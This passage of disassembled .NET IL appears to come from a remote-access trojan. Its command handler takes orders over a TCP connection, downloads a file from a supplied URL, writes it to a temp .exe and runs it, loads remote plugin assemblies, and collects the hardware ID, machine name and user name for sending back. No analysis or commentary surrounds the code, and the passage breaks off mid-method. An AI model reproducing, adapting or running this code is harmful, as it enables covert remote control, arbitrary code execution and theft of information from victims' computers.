      IL_1443:  ldloc.s    VB$t_string$L7
      IL_1445:  ldstr      "!"
      IL_144a:  ldc.i4.0
      IL_144b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1450:  ldc.i4.0
      IL_1451:  ceq
      IL_1453:  stloc.s    VB$CG$t_bool$S1
      IL_1455:  ldloc.s    VB$CG$t_bool$S1
      IL_1457:  brfalse.s  IL_146c

      IL_1459:  nop
      IL_145a:  ldc.i4.0
      IL_145b:  call       void w.OK::pr(int32)
      IL_1460:  nop
      IL_1461:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_1466:  nop
      IL_1467:  nop
      IL_1468:  br.s       IL_14a4

      IL_146a:  br.s       IL_14a4

      IL_146c:  nop
      IL_146d:  ldloc.s    VB$t_string$L7
      IL_146f:  ldstr      "@"
      IL_1474:  ldc.i4.0
      IL_1475:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_147a:  ldc.i4.0
      IL_147b:  ceq
      IL_147d:  stloc.s    VB$CG$t_bool$S1
      IL_147f:  ldloc.s    VB$CG$t_bool$S1
      IL_1481:  brfalse.s  IL_14a4

      IL_1483:  nop
      IL_1484:  ldc.i4.0
      IL_1485:  call       void w.OK::pr(int32)
      IL_148a:  nop
      IL_148b:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_1490:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_1495:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_149a:  pop
      IL_149b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_14a0:  nop
      IL_14a1:  nop
      IL_14a2:  br.s       IL_14a4

      IL_14a4:  nop
      IL_14a5:  nop
      IL_14a6:  leave      IL_192e

      IL_14ab:  nop
      IL_14ac:  ldloc.s    str4
      IL_14ae:  ldstr      "up"
      IL_14b3:  ldc.i4.0
      IL_14b4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_14b9:  ldc.i4.0
      IL_14ba:  ceq
      IL_14bc:  ldc.i4.0
      IL_14bd:  ceq
      IL_14bf:  stloc.s    VB$CG$t_bool$S1
      IL_14c1:  ldloc.s    VB$CG$t_bool$S1
      IL_14c3:  brfalse.s  IL_14ca

      IL_14c5:  br         IL_167b

      IL_14ca:  nop
      IL_14cb:  ldnull
      IL_14cc:  stloc.2
      IL_14cd:  ldloc.0
      IL_14ce:  ldc.i4.1
      IL_14cf:  ldelem.ref
      IL_14d0:  ldc.i4.0
      IL_14d1:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_14d6:  ldc.i4.s   31
      IL_14d8:  ceq
      IL_14da:  stloc.s    VB$CG$t_bool$S1
      IL_14dc:  ldloc.s    VB$CG$t_bool$S1
      IL_14de:  brfalse    IL_1566

      IL_14e3:  nop
      .try
      {
        IL_14e4:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_14e9:  stloc.s    stream6
        IL_14eb:  ldloc.0
        IL_14ec:  ldc.i4.0
        IL_14ed:  ldelem.ref
        IL_14ee:  ldsfld     string w.OK::Y
        IL_14f3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_14f8:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_14fd:  stloc.s    num4
        IL_14ff:  ldloc.s    stream6
        IL_1501:  ldarg.0
        IL_1502:  ldloc.s    num4
        IL_1504:  ldarg.0
        IL_1505:  ldlen
        IL_1506:  conv.ovf.i4
        IL_1507:  ldloc.s    num4
        IL_1509:  sub.ovf
        IL_150a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_150f:  nop
        IL_1510:  ldloc.s    stream6
        IL_1512:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_1517:  call       uint8[] w.OK::ZIP(uint8[])
        IL_151c:  stloc.2
        IL_151d:  nop
        IL_151e:  leave      IL_15be

        IL_1523:  leave.s    IL_1565

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1525:  dup
        IL_1526:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_152b:  stloc.s    exception13
        IL_152d:  nop
        IL_152e:  ldstr      "MSG"
        IL_1533:  ldsfld     string w.OK::Y
        IL_1538:  ldstr      "Update ERROR"
        IL_153d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1542:  call       bool w.OK::Send(string)
        IL_1547:  pop
        IL_1548:  ldstr      "bla"
        IL_154d:  call       bool w.OK::Send(string)
        IL_1552:  pop
        IL_1553:  nop
        IL_1554:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1559:  leave      IL_192e

        IL_155e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1563:  leave.s    IL_1565

      }  // end handler
      IL_1565:  nop
      IL_1566:  nop
      IL_1567:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_156c:  stloc.s    client2
      IL_156e:  nop
      .try
      {
        IL_156f:  ldloc.s    client2
        IL_1571:  ldloc.0
        IL_1572:  ldc.i4.1
        IL_1573:  ldelem.ref
        IL_1574:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_1579:  stloc.2
        IL_157a:  leave.s    IL_15bc

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_157c:  dup
        IL_157d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1582:  stloc.s    exception14
        IL_1584:  nop
        IL_1585:  ldstr      "MSG"
        IL_158a:  ldsfld     string w.OK::Y
        IL_158f:  ldstr      "Update ERROR"
        IL_1594:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1599:  call       bool w.OK::Send(string)
        IL_159e:  pop
        IL_159f:  ldstr      "bla"
        IL_15a4:  call       bool w.OK::Send(string)
        IL_15a9:  pop
        IL_15aa:  nop
        IL_15ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_15b0:  leave      IL_192e

        IL_15b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_15ba:  leave.s    IL_15bc

      }  // end handler
      IL_15bc:  nop
      IL_15bd:  nop
      IL_15be:  nop
      IL_15bf:  ldstr      "bla"
      IL_15c4:  call       bool w.OK::Send(string)
      IL_15c9:  pop
      IL_15ca:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_15cf:  ldstr      ".exe"
      IL_15d4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_15d9:  stloc.s    fileName
      IL_15db:  nop
      .try
      {
        IL_15dc:  ldstr      "MSG"
        IL_15e1:  ldsfld     string w.OK::Y
        IL_15e6:  ldstr      "Updating To "
        IL_15eb:  ldloc.s    fileName
        IL_15ed:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_15f2:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_15f7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_15fc:  call       bool w.OK::Send(string)
        IL_1601:  pop
        IL_1602:  ldc.i4     0x7d0
        IL_1607:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_160c:  nop
        IL_160d:  ldloc.s    fileName
        IL_160f:  ldloc.2
        IL_1610:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1615:  nop
        IL_1616:  ldloc.s    fileName
        IL_1618:  ldstr      ".."
        IL_161d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_1622:  pop
        IL_1623:  leave.s    IL_166d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1625:  dup
        IL_1626:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_162b:  stloc.s    exception15
        IL_162d:  nop
        IL_162e:  ldloc.s    exception15
        IL_1630:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1635:  nop
        IL_1636:  ldloc.s    exception15
        IL_1638:  stloc.s    exception7
        IL_163a:  ldstr      "MSG"
        IL_163f:  ldsfld     string w.OK::Y
        IL_1644:  ldstr      "Update ERROR "
        IL_1649:  ldloc.s    exception7
        IL_164b:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1650:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1655:  call       bool w.OK::Send(string)
        IL_165a:  pop
        IL_165b:  nop
        IL_165c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1661:  leave      IL_192e

        IL_1666:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_166b:  leave.s    IL_166d

      }  // end handler
      IL_166d:  nop
      IL_166e:  call       void w.OK::UNS()
      IL_1673:  nop
      IL_1674:  nop
      IL_1675:  leave      IL_192e

      IL_167a:  nop
      IL_167b:  nop
      IL_167c:  ldloc.s    str4
      IL_167e:  ldstr      "Ex"
      IL_1683:  ldc.i4.0
      IL_1684:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1689:  ldc.i4.0
      IL_168a:  ceq
      IL_168c:  stloc.s    VB$CG$t_bool$S1
      IL_168e:  ldloc.s    VB$CG$t_bool$S1
      IL_1690:  brfalse    IL_1781

      IL_1695:  ldsfld     object w.OK::PLG
      IL_169a:  ldnull
      IL_169b:  ceq
      IL_169d:  stloc.s    VB$CG$t_bool$S0
      IL_169f:  ldloc.s    VB$CG$t_bool$S0
      IL_16a1:  brfalse.s  IL_1707

      IL_16a3:  ldstr      "PLG"
      IL_16a8:  call       bool w.OK::Send(string)
      IL_16ad:  pop
      IL_16ae:  ldc.i4.0
      IL_16af:  stloc.s    num5
      IL_16b1:  br.s       IL_16c5

      IL_16b3:  ldloc.s    num5
      IL_16b5:  ldc.i4.1
      IL_16b6:  add.ovf
      IL_16b7:  stloc.s    num5
      IL_16b9:  ldc.i4     0x3e8
      IL_16be:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_16c3:  nop
      IL_16c4:  nop
      IL_16c5:  ldsfld     object w.OK::PLG
      IL_16ca:  ldnull
      IL_16cb:  ceq
      IL_16cd:  ldc.i4.0
      IL_16ce:  ceq
      IL_16d0:  ldloc.s    num5
      IL_16d2:  ldc.i4.s   20
      IL_16d4:  ceq
      IL_16d6:  or
      IL_16d7:  ldsfld     bool w.OK::Cn
      IL_16dc:  ldc.i4.0
      IL_16dd:  ceq
      IL_16df:  or
      IL_16e0:  ldc.i4.0
      IL_16e1:  ceq
      IL_16e3:  stloc.s    VB$CG$t_bool$S1
      IL_16e5:  ldloc.s    VB$CG$t_bool$S1
      IL_16e7:  brtrue.s   IL_16b3

      IL_16e9:  ldsfld     object w.OK::PLG
      IL_16ee:  ldnull
      IL_16ef:  ceq
      IL_16f1:  ldsfld     bool w.OK::Cn
      IL_16f6:  ldc.i4.0
      IL_16f7:  ceq
      IL_16f9:  or
      IL_16fa:  stloc.s    VB$CG$t_bool$S1
      IL_16fc:  ldloc.s    VB$CG$t_bool$S1
      IL_16fe:  brfalse.s  IL_1706

      IL_1700:  nop
      IL_1701:  leave      IL_192e

      IL_1706:  nop
      IL_1707:  nop
      IL_1708:  ldc.i4.1
      IL_1709:  newarr     [mscorlib]System.Object
      IL_170e:  stloc.s    VB$t_array$S2
      IL_1710:  ldloc.s    VB$t_array$S2
      IL_1712:  ldc.i4.0
      IL_1713:  ldarg.0
      IL_1714:  stelem.ref
      IL_1715:  nop
      IL_1716:  ldloc.s    VB$t_array$S2
      IL_1718:  stloc.s    arguments
      IL_171a:  ldc.i4.1
      IL_171b:  newarr     [mscorlib]System.Boolean
      IL_1720:  stloc.s    VB$t_array$S3
      IL_1722:  ldloc.s    VB$t_array$S3
      IL_1724:  ldc.i4.0
      IL_1725:  ldc.i4.1
      IL_1726:  stelem.i1
      IL_1727:  ldloc.s    VB$t_array$S3
      IL_1729:  stloc.s    copyBack
      IL_172b:  ldsfld     object w.OK::PLG
      IL_1730:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1735:  ldnull
      IL_1736:  ldstr      "ind"
      IL_173b:  ldloc.s    arguments
      IL_173d:  ldnull
      IL_173e:  ldnull
      IL_173f:  ldloc.s    copyBack
      IL_1741:  ldc.i4.1
      IL_1742:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1747:  pop
      IL_1748:  ldloc.s    copyBack
      IL_174a:  ldc.i4.0
      IL_174b:  ldelem.i1
      IL_174c:  stloc.s    VB$CG$t_bool$S1
      IL_174e:  ldloc.s    VB$CG$t_bool$S1
      IL_1750:  brfalse.s  IL_177b

      IL_1752:  ldloc.s    arguments
      IL_1754:  ldc.i4.0
      IL_1755:  ldelem.ref
      IL_1756:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_175b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1760:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1765:  ldtoken    uint8[]
      IL_176a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_176f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_1774:  castclass  uint8[]
      IL_1779:  starg.s    b
      IL_177b:  nop
      IL_177c:  br         IL_1874

      IL_1781:  ldloc.s    str4
      IL_1783:  ldstr      "PLG"
      IL_1788:  ldc.i4.0
      IL_1789:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_178e:  ldc.i4.0
      IL_178f:  ceq
      IL_1791:  stloc.s    VB$CG$t_bool$S1
      IL_1793:  ldloc.s    VB$CG$t_bool$S1
      IL_1795:  brfalse    IL_1874

      IL_179a:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_179f:  stloc.s    stream7
      IL_17a1:  ldloc.0
      IL_17a2:  ldc.i4.0
      IL_17a3:  ldelem.ref
      IL_17a4:  ldsfld     string w.OK::Y
      IL_17a9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_17ae:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_17b3:  stloc.s    num6
      IL_17b5:  ldloc.s    stream7
      IL_17b7:  ldarg.0
      IL_17b8:  ldloc.s    num6
      IL_17ba:  ldarg.0
      IL_17bb:  ldlen
      IL_17bc:  conv.ovf.i4
      IL_17bd:  ldloc.s    num6
      IL_17bf:  sub.ovf
      IL_17c0:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_17c5:  nop
      IL_17c6:  ldloc.s    stream7
      IL_17c8:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_17cd:  call       uint8[] w.OK::ZIP(uint8[])
      IL_17d2:  ldstr      "A"
      IL_17d7:  call       object w.OK::Plugin(uint8[],
                                               string)
      IL_17dc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_17e1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_17e6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_17eb:  stsfld     object w.OK::PLG
      IL_17f0:  ldsfld     object w.OK::PLG
      IL_17f5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_17fa:  ldnull
      IL_17fb:  ldstr      "H"
      IL_1800:  ldc.i4.1
      IL_1801:  newarr     [mscorlib]System.Object
      IL_1806:  stloc.s    VB$t_array$S2
      IL_1808:  ldloc.s    VB$t_array$S2
      IL_180a:  ldc.i4.0
      IL_180b:  ldsfld     string w.OK::H
      IL_1810:  stelem.ref
      IL_1811:  nop
      IL_1812:  ldloc.s    VB$t_array$S2
      IL_1814:  ldnull
      IL_1815:  ldnull
      IL_1816:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_181b:  nop
      IL_181c:  ldsfld     object w.OK::PLG
      IL_1821:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1826:  ldnull
      IL_1827:  ldstr      "P"
      IL_182c:  ldc.i4.1
      IL_182d:  newarr     [mscorlib]System.Object
      IL_1832:  stloc.s    VB$t_array$S2
      IL_1834:  ldloc.s    VB$t_array$S2
      IL_1836:  ldc.i4.0
      IL_1837:  ldsfld     string w.OK::P
      IL_183c:  stelem.ref
      IL_183d:  nop
      IL_183e:  ldloc.s    VB$t_array$S2
      IL_1840:  ldnull
      IL_1841:  ldnull
      IL_1842:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1847:  nop
      IL_1848:  ldsfld     object w.OK::PLG
      IL_184d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1852:  ldnull
      IL_1853:  ldstr      "c"
      IL_1858:  ldc.i4.1
      IL_1859:  newarr     [mscorlib]System.Object
      IL_185e:  stloc.s    VB$t_array$S2
      IL_1860:  ldloc.s    VB$t_array$S2
      IL_1862:  ldc.i4.0
      IL_1863:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_1868:  stelem.ref
      IL_1869:  nop
      IL_186a:  ldloc.s    VB$t_array$S2
      IL_186c:  ldnull
      IL_186d:  ldnull
      IL_186e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1873:  nop
      IL_1874:  nop
      IL_1875:  leave      IL_192d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_187a:  dup
      IL_187b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1880:  stloc.s    exception16
      IL_1882:  nop
      IL_1883:  ldloc.s    exception16
      IL_1885:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_188a:  nop
      IL_188b:  ldloc.s    exception16
      IL_188d:  stloc.s    exception8
      IL_188f:  ldloc.0
      IL_1890:  ldlen
      IL_1891:  conv.ovf.i4
      IL_1892:  ldc.i4.0
      IL_1893:  ble.s      IL_18ba

      IL_1895:  ldloc.0
      IL_1896:  ldc.i4.0
      IL_1897:  ldelem.ref
      IL_1898:  ldstr      "Ex"
      IL_189d:  ldc.i4.0
      IL_189e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18a3:  ldc.i4.0
      IL_18a4:  ceq
      IL_18a6:  ldloc.0
      IL_18a7:  ldc.i4.0
      IL_18a8:  ldelem.ref
      IL_18a9:  ldstr      "PLG"
      IL_18ae:  ldc.i4.0
      IL_18af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_18b4:  ldc.i4.0
      IL_18b5:  ceq
      IL_18b7:  or
      IL_18b8:  brtrue.s   IL_18bd

      IL_18ba:  ldc.i4.0
      IL_18bb:  br.s       IL_18be

      IL_18bd:  ldc.i4.1
      IL_18be:  stloc.s    VB$CG$t_bool$S1
      IL_18c0:  ldloc.s    VB$CG$t_bool$S1
      IL_18c2:  brfalse.s  IL_18ca

      IL_18c4:  ldnull
      IL_18c5:  stsfld     object w.OK::PLG
      IL_18ca:  nop
      IL_18cb:  nop
      .try
      {
        IL_18cc:  ldc.i4.5
        IL_18cd:  newarr     [mscorlib]System.String
        IL_18d2:  stloc.s    VB$t_array$S0
        IL_18d4:  ldloc.s    VB$t_array$S0
        IL_18d6:  ldc.i4.0
        IL_18d7:  ldstr      "ER"
        IL_18dc:  stelem.ref
        IL_18dd:  nop
        IL_18de:  ldloc.s    VB$t_array$S0
        IL_18e0:  ldc.i4.1
        IL_18e1:  ldsfld     string w.OK::Y
        IL_18e6:  stelem.ref
        IL_18e7:  nop
        IL_18e8:  ldloc.s    VB$t_array$S0
        IL_18ea:  ldc.i4.2
        IL_18eb:  ldloc.0
        IL_18ec:  ldc.i4.0
        IL_18ed:  ldelem.ref
        IL_18ee:  stelem.ref
        IL_18ef:  nop
        IL_18f0:  ldloc.s    VB$t_array$S0
        IL_18f2:  ldc.i4.3
        IL_18f3:  ldsfld     string w.OK::Y
        IL_18f8:  stelem.ref
        IL_18f9:  nop
        IL_18fa:  ldloc.s    VB$t_array$S0
        IL_18fc:  ldc.i4.4
        IL_18fd:  ldloc.s    exception8
        IL_18ff:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_1904:  stelem.ref
        IL_1905:  nop
        IL_1906:  ldloc.s    VB$t_array$S0
        IL_1908:  call       string [mscorlib]System.String::Concat(string[])
        IL_190d:  call       bool w.OK::Send(string)
        IL_1912:  pop
        IL_1913:  leave.s    IL_1925

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1915:  dup
        IL_1916:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_191b:  stloc.s    exception17
        IL_191d:  nop
        IL_191e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1923:  leave.s    IL_1925

      }  // end handler
      IL_1925:  nop
      IL_1926:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_192b:  leave.s    IL_192d

    }  // end handler
    IL_192d:  nop
    IL_192e:  nop
    IL_192f:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1050 (0x41a)
    .maxstack  4
    .locals init ([0] string inf,
             [1] string str2,
             [2] string str3,
             [3] class [mscorlib]System.Exception exception1,
             [4] class [mscorlib]System.Exception exception9,
             [5] class [mscorlib]System.Exception exception10,
             [6] class [mscorlib]System.Exception exception11,
             [7] class [mscorlib]System.Exception exception12,
             [8] string[] strArray,
             [9] class [mscorlib]System.Exception exception13,
             [10] class [mscorlib]System.Exception exception14,
             [11] string str4,
             [12] class [mscorlib]System.Exception exception15,
             [13] string VB$t_string$S0,
             [14] string VB$t_string$S1,
             [15] valuetype [mscorlib]System.DateTime VB$t_date$S0,
             [16] valuetype [mscorlib]System.DateTime VB$t_date$S1,
             [17] string[] VB$t_array$S0,
             [18] int32 VB$t_i4$L0,
             [19] string[] VB$t_array$L1,
             [20] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldstr      "ll"
    IL_0006:  ldsfld     string w.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    IL_0011:  nop
    .try
    {
      IL_0012:  ldstr      "vn"
      IL_0017:  ldstr      ""
      IL_001c:  call       object w.OK::GTV(string,
                                            object)
      IL_0021:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0026:  ldstr      ""
      IL_002b:  ldc.i4.0
      IL_002c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_0031:  stloc.s    VB$CG$t_bool$S0
      IL_0033:  ldloc.s    VB$CG$t_bool$S0
      IL_0035:  brfalse.s  IL_0067

      IL_0037:  ldloc.1
      IL_0038:  ldsflda    string w.OK::VN
      IL_003d:  call       string w.OK::DEB(string&)
      IL_0042:  ldstr      "_"
      IL_0047:  call       string w.OK::HWD()
      IL_004c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0051:  stloc.s    VB$t_string$S0
      IL_0053:  ldloca.s   VB$t_string$S0
      IL_0055:  call       string w.OK::ENB(string&)
      IL_005a:  ldsfld     string w.OK::Y
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  stloc.1
      IL_0065:  br.s       IL_00ae

      IL_0067:  nop
      IL_0068:  ldloc.1
      IL_0069:  ldstr      "vn"
      IL_006e:  ldstr      ""
      IL_0073:  call       object w.OK::GTV(string,
                                            object)
      IL_0078:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0082:  stloc.s    VB$t_string$S0
      IL_0084:  ldloca.s   VB$t_string$S0
      IL_0086:  call       string w.OK::DEB(string&)
      IL_008b:  ldstr      "_"
      IL_0090:  call       string w.OK::HWD()
      IL_0095:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009a:  stloc.s    VB$t_string$S1
      IL_009c:  ldloca.s   VB$t_string$S1
      IL_009e:  call       string w.OK::ENB(string&)
      IL_00a3:  ldsfld     string w.OK::Y
      IL_00a8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ad:  stloc.1
      IL_00ae:  nop
      IL_00af:  leave.s    IL_00da

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b1:  dup
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  stloc.3
      IL_00b8:  nop
      IL_00b9:  ldloc.1
      IL_00ba:  call       string w.OK::HWD()
      IL_00bf:  stloc.s    VB$t_string$S1
      IL_00c1:  ldloca.s   VB$t_string$S1
      IL_00c3:  call       string w.OK::ENB(string&)
      IL_00c8:  ldsfld     string w.OK::Y
      IL_00cd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00d2:  stloc.1
      IL_00d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d8:  leave.s    IL_00da

    }  // end handler
    IL_00da:  nop
    IL_00db:  nop
    .try
    {
      IL_00dc:  ldloc.1
      IL_00dd:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00e2:  ldsfld     string w.OK::Y
      IL_00e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ec:  stloc.1
      IL_00ed:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ef:  dup
      IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00f5:  stloc.s    exception9
      IL_00f7:  nop
      IL_00f8:  ldloc.1
      IL_00f9:  ldstr      "\?\?"
      IL_00fe:  ldsfld     string w.OK::Y
      IL_0103:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0108:  stloc.1
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010e:  leave.s    IL_0110

    }  // end handler
    IL_0110:  nop
    IL_0111:  nop
    .try
    {
      IL_0112:  ldloc.1
      IL_0113:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0118:  ldsfld     string w.OK::Y
      IL_011d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0122:  stloc.1
      IL_0123:  leave.s    IL_0146

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0125:  dup
